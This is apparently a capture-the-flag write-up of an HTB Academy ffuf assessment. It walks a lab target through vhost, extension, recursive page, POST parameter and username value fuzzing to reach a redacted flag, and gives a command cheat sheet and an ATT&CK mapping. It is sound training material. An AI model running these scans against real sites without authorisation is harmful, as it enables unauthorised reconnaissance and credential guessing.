# Module 15 — Attacking Web Applications with Ffuf: Skills Assessment

**Module:** Attacking Web Applications with Ffuf
**Platform:** HTB Academy
**Difficulty:** Easy
**Target IP:** 10.129.43.71
**Target Port:** 32596

---

## Overview

Five-question skills assessment covering the full ffuf workflow: VHost discovery → extension fuzzing → recursive page fuzzing with regex matching → POST parameter fuzzing → value fuzzing to retrieve a flag.

---

## Question 1 — Sub-domain / VHost Fuzzing

**"Run a sub-domain/vhost fuzzing scan on '\*.academy.htb' for the IP shown above. What are all the sub-domains you can identify?"**

### Approach

First run without filtering to identify the default (erroneous) response size:

```bash
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.129.43.71:32596 -H 'Host: FUZZ.academy.htb'
```

Default erroneous VHost returns **Size: 985**. Filter it out:

```bash
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.129.43.71:32596 -H 'Host: FUZZ.academy.htb' -fs 985
```

Alternatively, use `-ac` for automatic calibration:

```bash
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.129.43.71:32596 -H 'Host: FUZZ.academy.htb' -ac
```

### Output

```
test      [Status: 200, Size: 0, Words: 1, Lines: 1]
archive   [Status: 200, Size: 0, Words: 1, Lines: 1]
faculty   [Status: 200, Size: 0, Words: 1, Lines: 1]
```

**Answer:** `test archive faculty`

---

## Question 2 — Extension Fuzzing

**"Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?"**

### Approach

Add all three VHosts to `/etc/hosts`:

```bash
sudo bash -c 'echo "10.129.43.71 test.academy.htb archive.academy.htb faculty.academy.htb" >> /etc/hosts'
```

Run extension fuzzing against each VHost on `/indexFUZZ`:

```bash
# test
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://test.academy.htb:32596/indexFUZZ

# archive
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://archive.academy.htb:32596/indexFUZZ

# faculty
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:32596/indexFUZZ
```

### Results

| VHost | Extensions Found |
|---|---|
| test | `.php` (200), `.phps` (403) |
| archive | `.php` (200), `.phps` (403) |
| faculty | `.php` (200), `.phps` (403), `.php7` (200) |

**Answer:** `.php .phps .php7`

---

## Question 3 — Recursive Fuzzing + Regex Matcher

**"One of the pages you will identify should say 'You don't have access\!'. What is the full page URL?"**

### Approach

Fuzz the `faculty` VHost recursively (depth 1) with all three extensions. Filter the erroneous 287-byte response and match the target string with `-mr`:

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:32596/FUZZ -recursion -recursion-depth 1 -e .php,.phps,.php7 -fs 287 -mr "You don't have access!" -t 100
```

ffuf quickly discovers `/courses/` as a new queue entry. Cancel and target it directly:

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:32596/courses/FUZZ -e .php,.phps,.php7 -fs 287 -mr "You don't have access!" -t 100
```

### Output

```
linux-security.php7   [Status: 200, Size: 774, Words: 223, Lines: 53]
```

**Answer:** `http://faculty.academy.htb:32596/courses/linux-security.php7`

---

## Question 4 — POST Parameter Fuzzing

**"In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?"**

### Approach

First pass without filtering to identify the erroneous response size (774):

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:32596/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'
```

Filter erroneous size and re-run:

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:32596/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774 -t 100
```

### Output

```
user      [Status: 200, Size: 780]
username  [Status: 200, Size: 781]
```

**Answer:** `user username`

---

## Question 5 — Value Fuzzing → Flag

**"Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?"**

### Approach

Fuzz the `username` parameter with a names wordlist. First pass shows erroneous size is 781:

```bash
ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ -u http://faculty.academy.htb:32596/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781 -t 100
```

### Output

```
harry   [Status: 200, Size: 773]
```

Confirm with curl:

```bash
curl -s http://faculty.academy.htb:32596/courses/linux-security.php7 -X POST -d 'username=harry' | grep "HTB{.*}"
```

**Answer:** `HTB{...}`

---

## Full Attack Chain Summary

| Step | Technique | Tool / Flag | Result |
|---|---|---|---|
| 1 | VHost fuzzing | `ffuf -H 'Host: FUZZ.academy.htb' -fs 985` | test, archive, faculty |
| 2 | Extension fuzzing | `ffuf /indexFUZZ` per VHost | `.php`, `.phps`, `.php7` |
| 3 | Recursive page fuzzing + regex | `-recursion -e .php,.phps,.php7 -mr "You don't have access!"` | `/courses/linux-security.php7` |
| 4 | POST parameter fuzzing | `ffuf -X POST -d 'FUZZ=key' -fs 774` | `user`, `username` |
| 5 | Value fuzzing | `ffuf -d 'username=FUZZ' -fs 781` → `harry` | `HTB{...}` |

---

## Key Commands Reference

```bash
# VHost fuzzing with size filter
ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://IP:PORT -H 'Host: FUZZ.domain.htb' -fs <size>

# Auto-calibrate filter
ffuf -w subdomains.txt:FUZZ -u http://IP:PORT -H 'Host: FUZZ.domain.htb' -ac

# Extension fuzzing
ffuf -w web-extensions.txt:FUZZ -u http://vhost:PORT/indexFUZZ

# Recursive fuzzing with regex matcher
ffuf -w wordlist:FUZZ -u http://vhost:PORT/FUZZ -recursion -recursion-depth 1 \
  -e .php,.phps,.php7 -fs <size> -mr "target string" -t 100

# POST parameter fuzzing
ffuf -w burp-parameter-names.txt:FUZZ -u http://vhost:PORT/page \
  -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs <size>

# Value fuzzing
ffuf -w names.txt:FUZZ -u http://vhost:PORT/page \
  -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs <size>
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Active Scanning: Wordlist Scanning | T1595.003 | ffuf directory/page/extension fuzzing |
| Active Scanning: Scanning IP Blocks | T1595.001 | VHost/sub-domain enumeration |
| Gather Victim Host Information | T1592 | Extension fingerprinting per VHost |
| Exploitation for Credential Access | T1212 | POST parameter + value fuzzing to access flag |
